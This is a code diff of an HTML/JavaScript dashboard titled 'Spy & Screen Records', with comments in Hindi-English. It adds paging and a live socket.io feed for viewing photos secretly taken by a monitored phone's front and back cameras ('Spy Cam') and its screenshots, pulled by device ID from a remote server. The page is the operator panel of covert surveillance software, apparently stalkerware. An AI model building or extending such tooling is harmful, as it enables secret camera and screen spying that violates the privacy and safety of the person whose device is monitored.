@@ -5,6 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Spy & Screen Records</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+
     <style>
         /* --- DARK THEME --- */
         :root {
@@ -12,8 +14,8 @@
             --glass-bg: rgba(255, 255, 255, 0.05);
             --glass-border: rgba(255, 255, 255, 0.15);
             --text-main: #ffffff;
-            --accent-cam: #ff4444; /* Red for Spy */
-            --accent-screen: #00f3ff; /* Cyan for Screen */
+            --accent-cam: #ff4444; 
+            --accent-screen: #00f3ff; 
         }
         body {
             background-color: var(--bg-color);
@@ -33,7 +35,7 @@
         }
         .page-title { font-size: 1.1rem; font-weight: bold; color: #fff; text-transform: uppercase; letter-spacing: 1px; }
 
-        /* --- 2 TABS ONLY --- */
+        /* --- TABS --- */
         .tabs-container {
             display: flex; gap: 15px; margin-bottom: 25px;
             background: rgba(255,255,255,0.03); padding: 8px; border-radius: 15px;
@@ -47,50 +49,57 @@
             display: flex; align-items: center; justify-content: center; gap: 8px;
         }
         .tab-btn.active { color: #fff; background: rgba(255,255,255,0.05); border-radius: 10px; }
-        
-        /* Specific Tab Colors */
         .tab-btn[data-target="camera"].active { border-bottom-color: var(--accent-cam); color: var(--accent-cam); }
         .tab-btn[data-target="screen"].active { border-bottom-color: var(--accent-screen); color: var(--accent-screen); }
 
-        /* --- GRID --- */
+        /* --- GRID LAYOUT (FIXED FOR FULL IMAGE VIEW) --- */
         .gallery-container {
             display: grid;
-            grid-template-columns: repeat(3, 1fr); /* 3 photos per row */
-            gap: 10px;
-            padding-bottom: 50px;
+            grid-template-columns: repeat(2, 1fr); /* 2 Photos per row for better view */
+            gap: 15px;
+            padding-bottom: 20px;
         }
 
         .img-card {
-            aspect-ratio: 1 / 1;
             background: #000;
-            border-radius: 8px;
+            border-radius: 12px;
             overflow: hidden;
             position: relative;
             border: 1px solid var(--glass-border);
             cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+            /* Fixed height for uniformity */
+            height: 250px; 
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
+        
+        /* 🔥 FIX: Image Pura dikhane ke liye object-fit contain kiya */
         .img-card img {
-            width: 100%; height: 100%; object-fit: cover;
+            width: 100%; 
+            height: 100%; 
+            object-fit: contain; /* Pura photo dikhega, katega nahi */
+            background-color: #000;
             transition: transform 0.3s;
         }
-        .img-card:hover img { transform: scale(1.1); }
+        .img-card:hover img { transform: scale(1.02); }
 
-        /* Badge (Front/Back/Screen) */
         .source-badge {
             position: absolute; bottom: 0; left: 0; right: 0;
-            background: rgba(0,0,0,0.7); color: #fff;
-            font-size: 0.6rem; padding: 4px; text-align: center;
+            background: rgba(0,0,0,0.8); color: #fff;
+            font-size: 0.7rem; padding: 6px; text-align: center;
             text-transform: uppercase; letter-spacing: 0.5px;
         }
 
-        /* --- STATUS --- */
-        .status-msg { text-align: center; margin-top: 60px; color: #777; font-size: 0.9rem; display: none; }
-        .loader {
-            border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid var(--accent-screen);
-            border-radius: 50%; width: 30px; height: 30px;
-            animation: spin 1s linear infinite; margin: 0 auto 15px auto;
+        /* --- LOAD MORE BUTTON --- */
+        .load-more-container { text-align: center; margin-bottom: 50px; margin-top: 20px; }
+        .btn-load-more {
+            background: #333; color: #fff; border: 1px solid #555;
+            padding: 12px 30px; border-radius: 25px; cursor: pointer;
+            font-size: 0.95rem; display: inline-flex; align-items: center; gap: 10px;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn-load-more:hover { background: #444; }
 
         /* --- MODAL --- */
         .modal {
@@ -98,22 +107,31 @@
             left: 0; top: 0; width: 100%; height: 100%;
             background-color: rgba(0,0,0,0.95);
             align-items: center; justify-content: center; flex-direction: column;
+            padding: 10px; box-sizing: border-box;
         }
-        /* Modal Image Fix: Contain taaki puri screenshot dikhe */
         .modal img { 
-            max-width: 95%; max-height: 80vh; 
+            max-width: 100%; max-height: 85vh; 
             border-radius: 5px; box-shadow: 0 0 20px #000; 
             object-fit: contain; 
         }
-        .modal-close { position: absolute; top: 20px; right: 20px; color: #fff; font-size: 2rem; cursor: pointer; }
+        .modal-close { position: absolute; top: 15px; right: 20px; color: #fff; font-size: 2.5rem; cursor: pointer; z-index: 1001; }
         
-        .modal-actions { margin-top: 20px; display: flex; gap: 20px; }
+        .modal-actions { margin-top: 15px; display: flex; gap: 20px; }
         .action-btn {
             background: #333; color: #fff; padding: 10px 25px;
             border-radius: 30px; text-decoration: none; font-size: 0.9rem;
             display: flex; align-items: center; gap: 8px; border: 1px solid #555;
         }
         .btn-download { background: var(--accent-screen); color: #000; border: none; font-weight: bold; }
+
+        /* Loading Spinner */
+        .loader {
+            border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid var(--accent-screen);
+            border-radius: 50%; width: 30px; height: 30px;
+            animation: spin 1s linear infinite; margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status-msg { text-align: center; color: #888; margin-top: 50px; }
 
     </style>
 </head>
@@ -126,24 +144,28 @@
     </div>
 
     <div class="tabs-container">
-        <button class="tab-btn active" data-target="camera" onclick="filterFiles('camera')">
+        <button class="tab-btn active" data-target="camera" onclick="switchTab('camera')">
             <i class="fa-solid fa-eye"></i> Spy Cam
         </button>
-        <button class="tab-btn" data-target="screen" onclick="filterFiles('screen')">
+        <button class="tab-btn" data-target="screen" onclick="switchTab('screen')">
             <i class="fa-solid fa-mobile-screen"></i> Screen
         </button>
     </div>
 
-    <div id="loading" class="status-msg" style="display: block;">
-        <div class="loader"></div> Loading...
-    </div>
+    <div id="loading" class="loader" style="display: none;"></div>
     
-    <div id="emptyState" class="status-msg">
+    <div id="emptyState" class="status-msg" style="display: none;">
         <i class="fa-regular fa-folder-open" style="font-size: 2rem; margin-bottom: 10px;"></i><br>
         No captures found here.
     </div>
 
     <div class="gallery-container" id="galleryGrid"></div>
+
+    <div class="load-more-container" id="loadMoreArea" style="display: none;">
+        <button class="btn-load-more" onclick="fetchNextPage()">
+            Load More <i class="fa-solid fa-arrow-down"></i>
+        </button>
+    </div>
 
     <div id="imageModal" class="modal">
         <span class="modal-close" onclick="closeModal()">&times;</span>
@@ -157,92 +179,125 @@
     </div>
 
     <script>
-        // 🔥 SERVER URL
+        // 🔥 SERVER URL (Tumhara Server)
         const API_BASE = 'https://child-v9no.onrender.com'; 
         
         const urlParams = new URLSearchParams(window.location.search);
         const DEVICE_ID = urlParams.get('id') || localStorage.getItem('monitoring_id');
 
-        let allFilesData = []; 
-        let currentFilter = 'camera'; 
+        let allFilesData = []; // Saare photos yahan store honge
+        let currentFilter = 'camera'; // Default tab
+        let nextCursor = null; // Pagination cursor
+        let isLoading = false;
 
+        // UI Elements
         const galleryGrid = document.getElementById('galleryGrid');
-        const loading = document.getElementById('loading');
+        const loadingSpinner = document.getElementById('loading');
         const emptyState = document.getElementById('emptyState');
+        const loadMoreArea = document.getElementById('loadMoreArea');
         const modal = document.getElementById('imageModal');
         const fullImage = document.getElementById('fullImage');
         const downloadLink = document.getElementById('downloadLink');
         const tabs = document.querySelectorAll('.tab-btn');
 
+        // 🔥 1. SOCKET CONNECTION (Realtime Naye Photo ke liye)
+        const socket = io(API_BASE, { transports: ['websocket', 'polling'] });
+
         window.onload = function() {
             if(!DEVICE_ID) {
-                alert("Device ID not found!");
+                alert("Device ID Missing!");
                 return;
             }
-            fetchSavedFiles();
+            fetchFiles(true); // Pehli baar load karo
+            setupSocket();    // Live connection jodo
         };
 
-        function fetchSavedFiles() {
-            fetch(`${API_BASE}/api/gallery-list/${DEVICE_ID}`)
+        // ==========================================
+        //  2. FETCH DATA (Server se photos lao)
+        // ==========================================
+        function fetchFiles(isReset = false) {
+            if (isLoading) return;
+            isLoading = true;
+            loadingSpinner.style.display = 'block';
+
+            // URL mein pagination (cursor) logic
+            let url = `${API_BASE}/api/gallery-list/${DEVICE_ID}`;
+            if (nextCursor && !isReset) {
+                url += `?next_cursor=${nextCursor}`;
+            }
+
+            fetch(url)
                 .then(response => response.json())
                 .then(data => {
-                    loading.style.display = 'none';
-                    
-                    let files = [];
-                    if (data.photos) { files = data.photos; } 
-                    else if (Array.isArray(data)) { files = data; }
+                    loadingSpinner.style.display = 'none';
+                    isLoading = false;
 
-                    if (files.length > 0) {
-                        allFilesData = files;
-                        filterFiles('camera'); // Load default
+                    let newFiles = data.photos || [];
+                    
+                    // Agar server cursor bhej raha hai to save karo
+                    if (data.next_cursor) {
+                        nextCursor = data.next_cursor;
+                        loadMoreArea.style.display = 'block';
                     } else {
-                        emptyState.style.display = 'block';
-                        emptyState.innerText = "No data uploaded yet.";
+                        nextCursor = null;
+                        loadMoreArea.style.display = 'none';
                     }
+
+                    // Data Store Logic
+                    if (isReset) {
+                        allFilesData = newFiles; // Purana hata ke naya rakho
+                    } else {
+                        allFilesData = [...allFilesData, ...newFiles]; // Purane mein naya jodo
+                    }
+
+                    renderGallery();
                 })
-                .catch(error => {
-                    loading.innerHTML = "<span style='color:red'>Failed to connect.</span>";
-                    console.error(error);
+                .catch(err => {
+                    console.error("Fetch Error:", err);
+                    loadingSpinner.style.display = 'none';
+                    isLoading = false;
                 });
         }
 
-        // 🔥 UPDATED FILTER LOGIC (YAHAN CHANGE KIYA HAI)
-        function filterFiles(category) {
-            currentFilter = category;
+        // Load More button click par ye chalega
+        function fetchNextPage() {
+            if (nextCursor) fetchFiles(false);
+        }
 
-            // UI Update
+        // ==========================================
+        //  3. FILTER & RENDER (Photo dikhana)
+        // ==========================================
+        function switchTab(category) {
+            currentFilter = category;
+            
             tabs.forEach(btn => {
                 btn.classList.remove('active');
                 if(btn.dataset.target === category) btn.classList.add('active');
             });
 
-            galleryGrid.innerHTML = '';
-            emptyState.style.display = 'none';
+            renderGallery();
+        }
 
-            // Filter
+        function renderGallery() {
+            // Filter Logic: Camera ya Screen ke hisaab se chato
             const filtered = allFilesData.filter(url => {
                 const lowerUrl = url.toLowerCase();
-                
-                // TAB 1: SPY CAMERA
-                if (category === 'camera') {
-                    // Check for common camera terms
+                if (currentFilter === 'camera') {
                     return lowerUrl.includes('front') || lowerUrl.includes('back') || lowerUrl.includes('cam');
-                } 
-                // TAB 2: SCREENSHOT
-                else if (category === 'screen') {
-                    // Yahan fix kiya hai: "screen", "screenshot", "capture" sab allow kar diya
+                } else {
                     return lowerUrl.includes('screen') || lowerUrl.includes('shot') || lowerUrl.includes('capture');
                 }
-                
-                return false;
             });
+
+            galleryGrid.innerHTML = '';
 
             if (filtered.length === 0) {
                 emptyState.style.display = 'block';
                 return;
+            } else {
+                emptyState.style.display = 'none';
             }
 
-            // Render
             filtered.forEach(url => {
                 const div = document.createElement('div');
                 div.className = 'img-card';
@@ -253,6 +308,7 @@
                 if(url.includes('back')) badgeText = "Back Cam";
                 if(url.includes('screen')) badgeText = "Screen";
 
+                // Image tag creation
                 div.innerHTML = `
                     <img src="${url}" loading="lazy" onerror="this.style.display='none'">
                     <div class="source-badge">${badgeText}</div>
@@ -261,7 +317,32 @@
             });
         }
 
-        // Modal Functions
+        // ==========================================
+        //  4. REAL-TIME UPDATES (Socket Logic)
+        // ==========================================
+        function setupSocket() {
+            // Jab naya photo aaye
+            socket.on('new-file', (data) => {
+                console.log("New file received:", data);
+                if (data.device_id === DEVICE_ID) {
+                    // Array ke top par add karo
+                    allFilesData.unshift(data.url);
+                    
+                    // Check karo ki current tab mein dikhana hai ya nahi
+                    let isCam = data.url.includes('cam') || data.url.includes('front') || data.url.includes('back');
+                    let isScreen = data.url.includes('screen') || data.url.includes('shot');
+
+                    // Agar user ussi tab par hai jiska photo aaya hai, to refresh karo
+                    if ((currentFilter === 'camera' && isCam) || (currentFilter === 'screen' && isScreen)) {
+                        renderGallery(); 
+                    }
+                }
+            });
+        }
+
+        // ==========================================
+        //  MODAL LOGIC (Zoom View)
+        // ==========================================
         function openModal(url) {
             fullImage.src = url;
             downloadLink.href = url;
